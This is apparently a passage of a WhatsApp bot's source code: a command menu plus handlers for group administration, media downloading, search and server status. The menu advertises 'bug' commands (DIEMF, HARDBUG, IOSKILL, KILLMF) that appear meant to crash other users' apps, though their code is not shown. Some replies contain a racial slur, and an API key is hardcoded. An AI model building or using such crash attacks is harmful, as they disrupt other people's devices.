├─ ★ 𝗦𝗧𝗢𝗣𝗧𝗜𝗠𝗘
├─ ★ 𝗔𝗥𝗘𝗔𝗖𝗧
├─ ★ 𝗔𝗡𝗧𝗜𝗧𝗔𝗚
├─ ★ 𝗔𝗡𝗧𝗜𝗟𝗜𝗡𝗞
╰─────────────────▀▄▀▄▀▄

╭─☬ _ᎠϴᏔΝᏞϴᎪᎠ_ ☬
├─ ★ 𝗣𝗟𝗔𝗬𝗦𝗧𝗢𝗥𝗘
├─ ★ 𝗙𝗕
├─ ★ 𝗜𝗚
├─ ★ 𝗠𝗘𝗗𝗜𝗔𝗙𝗜𝗥𝗘
├─ ★ 𝗣𝗜𝗡𝗧𝗘𝗥𝗘𝗦𝗧
├─ ★ 𝗦𝗣𝗢𝗧𝗜𝗙𝗬
├─ ★ 𝗦𝗦
├─ ★ 𝗦𝗦𝗣𝗖
├─ ★ 𝗧𝗜𝗞𝗧𝗢𝗞
├─ ★ 𝗦𝗔𝗩𝗘
├─ ★ 𝗬𝗧𝗠𝗣𝟯
├─ ★ 𝗦𝗢𝗡𝗚
├─ ★ 𝗩𝗜𝗗𝗘𝗢
├─ ★ 𝗣𝗟𝗔𝗬
├─ ★ 𝗧𝗧𝗦𝗟𝗜𝗗𝗘
├─ ★ 𝗧𝗧𝗔𝗨𝗗𝗜𝗢
├─ ★ 𝗧𝗧𝗦𝗘𝗔𝗥𝗖𝗛
├─ ★ 𝗬𝗧𝗠𝗣𝟰
├─ ★ 𝗜𝗠𝗗𝗕
├─ ★ 𝗚𝗜𝗧𝗖𝗟𝗢𝗡𝗘
├─ ★ 𝗜𝗠𝗚
├─ ★ 𝗫𝗩𝗜𝗗𝗘𝗢𝗦𝗘𝗔𝗥𝗖𝗛
├─ ★ 𝗫𝗡𝗫𝗫𝗦𝗘𝗔𝗥𝗖𝗛
├─ ★ 𝗫𝗩𝗜𝗗𝗘𝗢𝗗𝗟
├─ ★ 𝗟𝗬𝗥𝗜𝗖𝗦
├─ ★ 𝗟𝗢𝗚𝗢
├─ ★ 𝗚𝗗𝗥𝗜𝗩𝗘
├─ ★ 𝗤𝗨𝗥𝗔𝗡 
├─ ★ 𝗕𝗜𝗕𝗟𝗘
├─ ★ 𝗩𝗢𝗟𝗔𝗨𝗗𝗜𝗢
├─ ★ 𝗩𝗢𝗟𝗩𝗜𝗗𝗘𝗢
├─ ★ 𝗔𝗡𝗜𝗠𝗘
├─ ★ 𝗖𝗔𝗣𝗖𝗨𝗧
├─ ★ 𝗧𝗜𝗞𝗧𝗢𝗞𝗦𝗧𝗔𝗟𝗞
├─ ★ 𝗘𝗡𝗖 (𝗣𝗥𝗘𝗠 𝗨𝗦𝗘𝗥)
├─ ★ 𝗗𝗘𝗖 (𝗣𝗘𝗠 𝗨𝗦𝗘𝗘)
├─ ★ 𝗧𝗧𝗠𝗣𝟯
╰─────────────────▀▄▀▄▀▄▀▄

╭─☬ _ҒႮΝ ϴᎡ ᏀᎪᎷᎬ ᎪΝᎠ ᏞϴᏀϴ_ ☬
├─ ★ 𝗧𝗥𝗨𝗧𝗛
├─ ★ 𝗗𝗔𝗥𝗘
├─ ★ 𝗔𝗞𝗜𝗥𝗔... 𝗔𝗡𝗗 𝗖𝗢.
├─ ★ 𝗚𝗟𝗜𝗧𝗖𝗛𝗧𝗘𝗫𝗧
├─ ★ 𝗪𝗥𝗜𝗧𝗘𝗧𝗘𝗫𝗧
├─ ★ 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗𝗚𝗟𝗢𝗪
├─ ★ 𝗧𝗬𝗣𝗢𝗚𝗥𝗔𝗣𝗛𝗬𝗧𝗘𝗫𝗧
├─ ★ 𝗣𝗜𝗫𝗘𝗟𝗚𝗟𝗜𝗧𝗖𝗛
├─ ★ 𝗡𝗘𝗢𝗡𝗚𝗟𝗜𝗧𝗖𝗛
├─ ★ 𝗙𝗟𝗔𝗚𝗧𝗘𝗫𝗧
├─ ★ 𝗙𝗟𝗔𝗚𝟯𝗗𝗧𝗘𝗫𝗧
├─ ★ 𝗗𝗘𝗟𝗘𝗧𝗜𝗡𝗚𝗧𝗘𝗫𝗧
├─ ★ 𝗕𝗟𝗔𝗖𝗞𝗣𝗜𝗡𝗞𝗦𝗧𝗟𝗬𝗘
├─ ★ 𝗚𝗟𝗢𝗪𝗜𝗡𝗚𝗧𝗘𝗫𝗧
├─ ★ 𝗨𝗡𝗗𝗘𝗥𝗪𝗔𝗧𝗘𝗥𝗧𝗘𝗫𝗧
├─ ★ 𝗟𝗢𝗚𝗢𝗠𝗔𝗞𝗘𝗥
├─ ★ 𝗖𝗔𝗥𝗧𝗢𝗢𝗡𝗦𝗧𝗬𝗟𝗘
├─ ★ 𝗣𝗔𝗣𝗘𝗥𝗖𝗨𝗧𝗦𝗥𝗬𝗟𝗘
├─ ★ 𝗪𝗔𝗧𝗘𝗥𝗖𝗢𝗟𝗢𝗥𝗧𝗘𝗫𝗧
├─ ★ 𝗘𝗙𝗙𝗘𝗖𝗧𝗖𝗟𝗢𝗨𝗗𝗦
├─ ★ 𝗕𝗟𝗔𝗖𝗞𝗣𝗜𝗡𝗞𝗟𝗢𝗚𝗢
├─ ★ 𝗚𝗥𝗔𝗗𝗜𝗘𝗡𝗧𝗧𝗘𝗫𝗧
├─ ★ 𝗦𝗨𝗠𝗠𝗘𝗥𝗕𝗘𝗔𝗖𝗛
├─ ★ 𝗟𝗨𝗫𝗨𝗥𝗬𝗚𝗢𝗟𝗗
├─ ★ 𝗠𝗨𝗟𝗧𝗜𝗖𝗢𝗟𝗢𝗥𝗘𝗗𝗡𝗘𝗢𝗡
├─ ★ 𝗦𝗔𝗡𝗗𝗦𝗨𝗠𝗠𝗘𝗥
├─ ★ 𝗚𝗔𝗟𝗔𝗫𝗬𝗪𝗔𝗟𝗟𝗣𝗔𝗣𝗘𝗥
├─ ★ 𝟭𝟵𝟭𝟳𝗦𝗧𝗬𝗟𝗘
├─ ★ 𝗟𝗜𝗚𝗛𝗧𝗘𝗙𝗙𝗘𝗖𝗧𝗦
├─ ★ 𝗥𝗢𝗬𝗔𝗟𝗧𝗘𝗫𝗧
├─ ★ 𝗚𝗔𝗟𝗔𝗫𝗬𝗦𝗧𝗬𝗟𝗘
├─ ★ 𝗠𝗔𝗞𝗜𝗡𝗚𝗡𝗘𝗢𝗡
├─ ★ 𝗙𝗥𝗘𝗘𝗖𝗥𝗘𝗔𝗧𝗘
╰─────────────────▀▄▀▄▀▄▀▄

╭─☬ _ᎪᏆ_ ☬
├─ ★ 𝗚𝗘𝗠𝗜𝗡𝗜
├─ ★ 𝗨𝗣𝗦𝗖𝗔𝗟𝗘
├─ ★ 𝗧𝗥
╰─────────────────▀▄▀▄▀▄▀▄▀▄

╭─☬ _ᏔᎻᎪͲՏᎪᏢᏢ_ ☬
├─ ★ 𝗖𝗟𝗘𝗔𝗥
├─ ★ 𝗗𝗘𝗟𝗘𝗧𝗘
├─ ★ 𝗗𝗟𝗧
├─ ★ 𝗦𝗧𝗔𝗧𝗨𝗦
├─ ★ 𝗥𝗘𝗔𝗗
├─ ★ 𝗢𝗡𝗟𝗜𝗡𝗘
├─ ★ 𝗩𝗩
├─ ★ 𝗣𝗢𝗟𝗟
├─ ★ 𝗖𝗛𝗞𝗜𝗗𝗖𝗛
├─ ★ 𝗖𝗥𝗘𝗔𝗧𝗘𝗚𝗖
├─ ★ 𝗦𝗘𝗧𝗦𝗨𝗗𝗢
├─ ★ 𝗗𝗘𝗟𝗦𝗨𝗗𝗢
├─ ★ 𝗟𝗜𝗦𝗧𝗦𝗨𝗗𝗢
├─ ★ 𝗚𝗘𝗧𝗗𝗘𝗩𝗜𝗖𝗘
├─ ★ 𝗕𝗟𝗢𝗖𝗞
├─ ★ 𝗧𝗔𝗚𝗔𝗟𝗟
├─ ★ 𝗧𝗢𝗩𝗩
├─ ★ 𝗧𝗔𝗚𝗔𝗗𝗠𝗜𝗡
├─ ★ 𝗧𝗢𝗧𝗔𝗚
├─ ★ 𝗦𝗧𝗬𝗟𝗘𝗧𝗘𝗫𝗧
├─ ★ 𝗥𝗘𝗤𝗨𝗘𝗦𝗧/𝗕𝗨𝗚
├─ ★ 𝗩𝗩𝟮
├─ ★ 𝗖𝗥𝗘𝗔𝗧𝗢𝗥
├─ ★ 𝗟𝗢𝗚𝗢𝗨𝗧
├─ ★ 
╰─────────────────▀▄▀▄▀▄▀▄▀▄▀▄▀

╭─☬ _ՏͲᏆᏟᏦᎬᎡ_ ☬
├─ ★ 𝗣𝗛𝗢𝗧𝗢
├─ ★ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥
├─ ★ 𝗧𝗢𝗜𝗠𝗚
├─ ★ 𝗧𝗔𝗞𝗘
├─ ★ 𝗤𝗖
├─ ★ 𝗦𝗧𝗘𝗔𝗟
├─ ★ 𝗪𝗥𝗜𝗧𝗘
╰─────────────────▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄

╭─☬ _ᎪႮᎠᏆϴ_ ☬
├─ ★ 𝗕𝗔𝗦𝗘
├─ ★ 𝗕𝗟𝗢𝗪𝗡
├─ ★ 𝗗𝗘𝗘𝗣
├─ ★ 𝗘𝗔𝗥𝗥𝗔𝗣𝗘
├─ ★ 𝗙𝗔𝗦𝗧
├─ ★ 𝗙𝗔𝗧
├─ ★ 𝗡𝗜𝗚𝗛𝗧𝗖𝗢𝗥𝗘
├─ ★ 𝗥𝗘𝗩𝗘𝗥𝗦𝗘
├─ ★ 𝗦𝗟𝗢𝗪
├─ ★ 𝗦𝗠𝗢𝗢𝗧𝗛
├─ ★ 𝗦𝗤𝗨𝗜𝗥𝗥𝗘𝗟
├─ ★ 𝗥𝗢𝗕𝗢𝗧
╰─────────────────▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀

╭─☬ _ᏴႮᏀᎷᎬΝႮ_ ☬
├─ ۝ 𝗗𝗜𝗘𝗠𝗙 (𝗗𝗠 𝗕𝗨𝗚𝗦)
├─ ۝ 𝗛𝗔𝗥𝗗𝗕𝗨𝗚
├─ ۝ 𝗜𝗢𝗦𝗞𝗜𝗟𝗟 - 𝗖𝗢𝗠𝗜𝗡𝗚
├─ ۝ 𝗞𝗜𝗟𝗟𝗠𝗙 - 𝗖𝗢𝗠𝗜𝗡𝗚
╰─────────────────𖠄𖣘𖠄𖣘𖠄𖣘𖠄𖣘𖣘𖠄𖣘𖠄𖠄
> ©ɴøʙøᴅʏ`
    nØbødy.sendMessage(m.chat, {
        image: {
            url: "https://img12.pixhost.to/images/829/574783260_yilzishop.jpg"
        },
        caption: Menu,
        gifPlayback: false
    }, { quoted: ctt });
}
break
case 'restart': case 'restartbot': case 'stoptempor':{
                m.reply(`Sedang ${command} Mohon tunggu`)
                await sleep(2300)
                process.exit(1);
                m.reply(`sukses ${command}`)
            }
            break
            case 'shutdown':
                if (!DevOnly) return reply1("OWNER ONLY BRO")
                reply1(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
case 'antilink': {

if (m.isGroup) {

if (global.db.groups[m.chat].banned) return

}

if (global.db.users[m.sender].banned) return m.reply('The bot is banned here')

if (!m.isGroup) return m.reply('Group Only bro')

if (!isAdmins) return m.reply('Admin only bro')

if (!isBotAdmins) return m.reply('Bot must be An administrator bro')

if (!text) return m.reply(example('<kick/delete> or antilink off'))

const action = text

if (action === 'kick') {

if (global.db.groups[m.chat].antilink) return m.reply('Already activated in this group')

global.db.groups[m.chat].antilink = true

global.db.groups[m.chat].antilink2 = false

await m.reply('Succesfully activated antilink to kick any link sender')

} else if (action === 'delete') {

if (global.db.groups[m.chat].antilink2) return m.reply('Already activated in this group')

global.db.groups[m.chat].antilink2 = true

global.db.groups[m.chat].antilink = false

await m.reply('Succesfully activated antilink to delete any sent link')

} else if (action === 'off') {

global.db.groups[m.chat].antilink = false

global.db.groups[m.chat].antilink2 = false

await m.reply('Succesfully deactivated antilink feature in this group')

} else {

m.reply('Invalid action the actions are kick/delete!')

}

} 

break
case 'invite1': {
	if (!m.isGroup) return m.reply("NIGGA THIS IS A GROUP COMMAND")
	if (!isBotAdmins) return reply1("THIS COMMAND CAN BE USE WHEN BOT IS AN ADMIN")
if (!text) return reply1(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return reply1(`Enter the number together without *+*`)
if (isNaN(text)) return reply1(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await nØbødy.groupInviteCode(group)
      await nØbødy.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply1(` An invite link is sent to the user`) 
}
break
case 'add':
                if (!m.isGroup) return m.reply("NIGGA THIS IS A GROUP COMMAND")
                if(!DevOnly) return reply1("OWNER ONLY BRO")
                if (!isBotAdmins) return reply1("THIS COMMAND CAN BE USE WHEN BOT IS AN ADMIN")
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nØbødy.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                reply1('Successfully Done ✊')
                break
case 'promote':
                if (!m.isGroup) return m.reply("NIGGA THIS IS A GROUP COMMAND")
                if (!isAdmins && !isGroupOwner && !DevOnly) return reply1("NIGGA YOU MUST BE ADMIN TO USE THIS COMMAND")
                if (!isBotAdmins) return reply1("THIS COMMAND CAN BE USE WHEN BOT IS AN ADMIN")
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await nØbødy.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                reply1('Member promoted successfully')
                break
case 'creategc': case 'creategroup': {
if (!DevOnly) return reply1("OWNER ONLY BRO")
if (!args.join(" ")) return reply1(`Use ${prefix+command} groupname`)
try {
let cret = await nØbødy.groupCreate(args.join(" "), [])
let response = await nØbødy.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Lagos/Africa").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
nØbødy.sendMessage(m.chat, { text:teksop, mentions: await nØbødy.parseMention(teksop)}, {quoted:m})
} catch {
	reply1(`GROUP HAS BEEN SUCCESSFULLY CREATED`)
	}
}
break
case 'ttslide':
			case 'tiktokfoto':
			case 'tiktokmp4':
			case 'tt':
			case 'ttnowm':
			case 'tiktoknowm':
			case 'tiktok': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`⚠️ Hmm... I haven't given you the link yet! 🫣 Try typing it like this: *${prefix + command} https://vt.tiktok.com/ZS8KdFQcQ/* so Super can help! 🎥✨`);
				try {
					await reactionMessage('⌛');
					let anu = await tiktokDownloaderVideo(text);
					let item = 0;
					for (let imgs of anu.data) {
						if (imgs.type == "nowatermark") {
							await nØbødy.sendMessage(
								m.chat,
								{
									video: { url: imgs.url },
									caption: `🎥 *Video Info* :\n📍 Region: ${anu.region}\n⏳ Duration: ${anu.duration}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistics Info* :\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info* :\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info* :\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption* :\n${anu.title || 'No Caption'}`
								},
								{ quoted: m }
							);
						}
						if (imgs.type == "photo") {
							if (item == 0) {
								await nØbødy.sendMessage(
									m.chat,
									{
										image: { url: imgs.url },
										caption: `🖼️ *Photo Info* :\n📍 Region: ${anu.region}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistics Info* :\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info* :\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info* :\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption* :\n${anu.title || 'No Caption'}${m.isGroup ? anu.data.length > 1 ? "\n📥 _The remaining photos are sent to private chat_\n" : "\n" : "\n"}`
									},
									{ quoted: m }
								);
							} else {
								await nØbødy.sendMessage(
									m.sender,
									{
										image: { url: imgs.url }
									},
									{ quoted: m }
								);
							}
							item += 1;
							await sleep(2000);
						}
					}
				} catch (err) {
					console.log(err);
					reply1('⚠️ Failed to fetch data from TikTok. Make sure the URL is valid or try again later..');
				}
			}
			global.db.users[m.sender].banned -= 1;
			break;

			case 'ttaudio':
			case 'tiktokmp3':
			case 'ttmp3':
			case 'tiktokaudio': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`⚠️ Hmm... you haven't given you the link yet! 🫣 Try typing it like this: *${prefix + command} https://vt.tiktok.com/ZS8KdFQcQ/* so super can help! 🎥✨`);
				try {
					await reactionMessage('⌛');
					let anu = await tiktokDownloaderVideo(text);
					let audio = anu.music_info.url;
					await nØbødy.sendMessage(
						m.chat,
						{
							text: `🎵 *TikTok Audio*\n\n` +
							`🎼 *Title:* ${anu.music_info.title || '-'}\n` +
							`🎤 *Author:* ${anu.music_info.author || '-'}\n` +
							`💿 *Album:* ${anu.music_info.album || '-'}\n\n` +
							`🔗 *Source:* ${text}`
						},
						{ quoted: m }
					);
					await nØbødy.sendMessage(
						m.chat,
						{
							audio: { url: audio },
							mimetype: 'audio/mpeg',
							fileName: `${anu.music_info.title || 'audio'}.mp3`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await reply1(`❌  An error occurred while capturing audio. Please try again later, okay?!`);
				}
			}
			global.db.users[m.sender].banned -= 1;
			break;

			case 'tiktoksearch':
			case 'tiktoks':
			case 'ttsearch': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`⚠️Hey, you forgot to give you a keyword! 😗 Try typing it like this: *${prefix + command} jj epep* so Super can help you find what you want! 🔍💬`);
				try {
					await reactionMessage('⌛');
					let search = await tiktokSearchVideo(text);
					let teks = `🎥 *${search.videos[0].title}*\n\n` +
					`🆔 *Video ID* : ${search.videos[0].video_id}\n` +
					`👤 *Username* : ${search.videos[0].author.unique_id}\n` +
					`🏷️ *Nickname* : ${search.videos[0].author.nickname}\n` +
					`⏳ *Duration* : ${search.videos[0].duration} second\n` +
					`❤️ *VT Like* : ${search.videos[0].digg_count}\n` +
					`💬 *Comment* : ${search.videos[0].comment_count}\n` +
					`🔄 *Share* : ${search.videos[0].share_count}\n\n` +
					`🔗 *Link*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;
					let list = '';
					let no = 1;
					for (let i of search.videos) {
						list += `\n${no++}. 🎵 *${i.title}*\n` +
						`⏳ Duration: ${i.duration} second\n` +
						`❤️ Likes: ${i.digg_count}\n` +
						`💬 Comments: ${i.comment_count}\n` +
						`🔄 Shares: ${i.share_count}\n` +
						`🔗 Link: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
					}
					await nØbødy.sendMessage(
						m.chat,
						{
							video: { url: `https://tikwm.com${search.videos[0].play}` },
							caption: teks
						},
						{ quoted: m }
					);
					if (search.videos.length > 1) {
						await nØbødy.sendMessage(
							m.chat,
							{
								text: `📚 *More Video List:*\n${list}`
							},
							{ quoted: m }
						);
					}
				} catch (error) {
					console.log(error);
				}
			}
			global.db.users[m.sender].banned -= 1;
			break;
case 'yt':
case 'play1':
case 'ytplay': {
    if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
    if (!text) return reply1(`Example: ${prefix + command} Favorite song`);
    try {
        await reactionMessage('⏱️');
        const search = await yts(`${text}`);
        if (!search || search.all.length === 0) return reply1(`*Song not found!* ☹️`);
        const { 
            videoId, 
            image, 
            title, 
            views, 
            duration, 
            author, 
            ago, 
            url, 
            description 
        } = search.all[0];
        const button = [{
            "name": "single_select",
            "buttonParamsJson": `{
                "title": "Click Here ⎙",
                "sections": [
                    {
                        "title": "Download Audio 🎧",
                        "rows": [
                            {
                                "header": "Low Quality (64kbps) 🐣",
                                "title": "Audio (64kbps) - Data Saver",
                                "id": ".ytmp3 ${url} 1"
                            },
                            {
                                "header": "Standard Quality (128kbps) 🎵",
                                "title": "Audio (128kbps) - Good for listening",
                                "id": ".ytmp3 ${url} 2"
                            },
                            {
                                "header": "Good Quality (192kbps) 🎶",
                                "title": "Audio (192kbps) - Clearer!",
                                "id": ".ytmp3 ${url} 3"
                            },
                            {
                                "header": "High Quality (256kbps) 🎼",
                                "title": "Audio (256kbps) - Cool and clear",
                                "id": ".ytmp3 ${url} 4"
                            },
                            {
                                "header": "Ultra Quality (320kbps) 🎧",
                                "title": "Audio (320kbps) - Super HD!",
                                "id": ".ytmp3 ${url} 5"
                            }
                        ]
                    },
                    {
                        "title": "Download Video 🎥",
                        "rows": [
                            {
                                "header": "Low Resolution (144p) 🐾",
                                "title": "Video (144p) - Data Saver",
                                "id": ".ytmp4 ${url} 1"
                            },
                            {
                                "header": "Medium Resolution (240p) 📱",
                                "title": "Video (240p) - Fairly Clear",
                                "id": ".ytmp4 ${url} 2"
                            },
                            {
                                "header": "Standard Resolution (360p) 🎬",
                                "title": "Video (360p) - Decent for watching",
                                "id": ".ytmp4 ${url} 3"
                            },
                            {
                                "header": "High Resolution (480p) 📺",
                                "title": "Video (480p) - Quite Clear",
                                "id": ".ytmp4 ${url} 4"
                            },
                            {
                                "header": "HD Resolution (720p) 🌟",
                                "title": "Video (720p) - HD, awesome!",
                                "id": ".ytmp4 ${url} 5"
                            },
                            {
                                "header": "Full HD Resolution (1080p) 💎",
                                "title": "Video (1080p) - Full HD, wow!",
                                "id": ".ytmp4 ${url} 6"
                            }
                        ]
                    }
                ]
            }`
        }];
        let caption = `*${title}*\n\n`;
        caption += `*🎶 Type*: Play\n`;
        caption += `*📌 ID*: ${videoId}\n`;
        caption += `*⏱️ Duration*: ${duration}\n`;
        caption += `*🕒 Uploaded*: ${ago}\n`;
        caption += `*🔗 Link*: ${url}\n\n`;
        caption += `_*Choose the download type you need... pick the one that suits you best!*_`;
        await sendButtonImage(m.chat, '', caption, { url: image }, button, m)
    } catch (error) {
        console.log(error);
    }
}
global.db.users[m.sender].banned -= 1;
break;
	
case 'getjoinrequest':{
				if (!m.isGroup) return reply1(mess.group);
				if (!isBotAdmins) return reply1(mess.botAdmin);
				if (!isAdmins && !isCreator) return reply1(mess.admin);
				const response = await nØbødy.groupRequestParticipantsList(m.chat);
				if (!response || !response.length) {
					nØbødy.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
					return;
				}
				let replyMessage = `Join Request List:\n`;
				response.forEach((request, index) => {
					const { jid, request_method, request_time } = request;
					const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
					replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
					replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
					replyMessage += `\n🧪 *Method:* ${request_method}`;
					replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
				});
				nØbødy.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
			};
			break;
case "pinterest":
case "pin": {
                if(!text) return m.reply("𝐏𝐥𝐞𝐚𝐬𝐞 𝐈𝐧𝐩𝐮𝐭 𝐀 𝐍𝐚𝐦𝐞 𝐎𝐫 𝐖𝐨𝐫𝐝 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐅𝐫𝐨𝐦 𝐏𝐢𝐧𝐭𝐞𝐫𝐞𝐬𝐭");
                let anu = `https://api.diioffc.web.id/api/search/pinterest?query=${encodeURIComponent(text)}`;
                const res = await fetch(anu);
                const response = await res.json();
                let result = response.result[Math.floor(Math.random() * response.result.length)];
                try {
                    nØbødy.sendMessage(m.chat, { 
                        image: { 
                            url: result.src }, 
                            caption: "𝐒𝐔𝐏𝐄𝐑 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐘𝐎𝐔𝐑 𝐑𝐄𝐐𝐔𝐄𝐒𝐓" }, 
                            { 
                                quoted: m 
                            }
                        );
                } catch (e) {
                    console.warn(e);
                    await m.reply("𝐄𝐫𝐫𝐨𝐫 𝐩𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐀𝐠𝐚𝐢𝐧")
                }
            }
            break
case 'request':
			case 'reportbug': {
				if (!text) return reply1(`єχαмρℓє: ${prefix + command} нι ∂єν{ησвσ∂у} ρℓєαѕє α∂∂ мσяє вυgѕ σя αηутнιηg 😂`);
				textt = `*| яєqυєѕт/вυg |*`;
				teks1 = `\n\n*υѕєя* : @${m.sender.split("@")[0]}\n*Request/вυg* : ${text}`;
				teks2 = `\n\n*Hii ${pushname}, уσυя яєqυєѕт нαѕ вєєη ѕєηт тσ му σωηєя, ωαιт α мιηυтє...*`;
				for (let i of Owner) {
					nØbødy.sendMessage(i + "@s.whatsapp.net", {
						text: textt + teks1,
						mentions: [m.sender],
					}, {
						quoted: m,
					});
				}
				nØbødy.sendMessage(m.chat, {
					text: textt + teks2 + teks1,
					mentions: [m.sender],
				}, {
					quoted: m,
				});
			}
			break;            
case 'tes':
case 'test': {
    const caption = `Hi there! ✨ Super is active now and ready to accompany you anytime! 🤗💕\nIf you want to start something or check how fast Super responds, just click the button below! 👇✨`;

    nØbødy.sendMessage(m.chat, {
        image: thumb,
        caption: caption,
        footer: `${botName} • Super is always ready for you! 💬`,
        buttons: [
            {
                buttonId: `${prefix}menu`,
                buttonText: { displayText: "🚀 Start" }
            },
            {
                buttonId: `${prefix}ping`,
                buttonText: { displayText: "📶 Check Status" }
            }
        ],
        viewOnce: true,
        headerType: 4
    }, { quoted: fconver });
}
break;
case 'listonline': case 'liston': {
				if (!m.isGroup) return reply1(mess.group);
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await nØbødy.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `@` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => reply1('*Data not found ❌*'))
			}
			break;	
case 'speed': case 'ping': {
    try {
        const used = process.memoryUsage();
        const cpus = os.cpus().map(cpu => {
            cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
            return cpu;
        });
        const cpu = cpus.reduce((last, cpu, _, { length }) => {
            last.total += cpu.total;
            last.speed += cpu.speed / length;
            last.times.user += cpu.times.user;
            last.times.nice += cpu.times.nice;
            last.times.sys += cpu.times.sys;
            last.times.idle += cpu.times.idle;
            last.times.irq += cpu.times.irq;
            return last;
        }, {
            speed: 0,
            total: 0,
            times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
        });
        let start = performance.now();
        let end = performance.now();
        let latency = end - start;
        let osInfo = await nou.os.oos();
        let storage = await nou.drive.info();
        let response = `✨ *WhatsApp Bot Information* ✨\n\n📡 *Server Network*\n · *Ping:* ${latency.toFixed(4)} seconds\n\n🖥️ *Server Information*\n · *OS:* ${osInfo}\n · *IP Address:* ${nou.os.ip()}\n · *OS Type:* ${nou.os.type()}\n\n💾 *RAM:*\n · *Total:* ${formatp(os.totalmem())}\n · *Used:* ${formatp(os.totalmem() - os.freemem())}\n\n📂 *Storage:*\n · *Total:* ${storage.totalGb} GB\n · *Used:* ${storage.usedGb} GB (${storage.usedPercentage}%)\n · *Available:* ${storage.freeGb} GB (${storage.freePercentage}%)\n\n⏳ *Server Uptime:*\n${runtime(process.uptime())}\n\n⚙️ *CPU (${cpus.length} Cores)*\n · *Model:* ${cpus[0].model.trim()}\n · *Speed:* ${cpu.speed} MHz\n${Object.keys(cpu.times).map(type => ` · *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n\nStay motivated! Super is always ready to help 🥰`;
        await nØbødy.sendMessage(m.chat, {
            text: response,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: amiraname,
                    newsletterJid: amira,
                },
                externalAdReply: {
                    title: ucapanWaktu,
                    thumbnailUrl: thumbUrl,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } catch (err) {
        console.error(err);
    }
}
break;
case 'imdb': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`🎬 *Where is the movie or series title?*\n\nExample:\n${prefix}${command} Inception`);

				try {
					await reactionMessage('⏳');
					let { data } = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${encodeURIComponent(text)}&plot=full`);

					if (data.Response === 'False') {
						return reply1(`❌ *Movie or series not found!* Please check the title again.`);
					}

					let imdbInfo = `🎬 *Title:* ${data.Title}\n`;
					imdbInfo += `📅 *Year:* ${data.Year}\n`;
